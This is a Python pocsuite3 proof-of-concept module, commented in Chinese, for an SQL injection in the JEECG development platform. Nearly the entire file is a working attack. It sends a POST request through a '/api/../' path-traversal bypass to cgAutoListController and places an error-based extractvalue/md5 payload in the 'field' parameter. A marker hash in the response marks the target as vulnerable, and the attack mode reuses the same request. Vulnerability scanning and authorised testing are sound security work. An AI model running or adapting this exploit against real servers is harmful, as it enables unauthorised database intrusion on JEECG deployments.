from collections import OrderedDict
import urllib.parse
import re,random
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '20230603'  #漏洞公开的时间,不知道就写今天
    createDate = '20230603'  # 编写 PoC 的日期
    updateDate = '20230603'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'jeecgboot_field_sql'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'JEECG'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        JEECG 微云快速开发平台 field sql注入漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        payload = 'extractvalue(1,concat(char(126),md5(76456456787)))'
        path = "/api/../cgAutoListController.do?datagrid&configId=jform_contact&field=" + payload
        url = self.url + path
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                'Content-Type':'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
        }
        data = 'page=1&rows=10&sort=create_date&order=desc'
        try:
            resp = requests.post(url=url, headers=headers,data=data, verify=False, timeout=20)
            if '205b20e7a0bc52180f205e6ed151abc' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)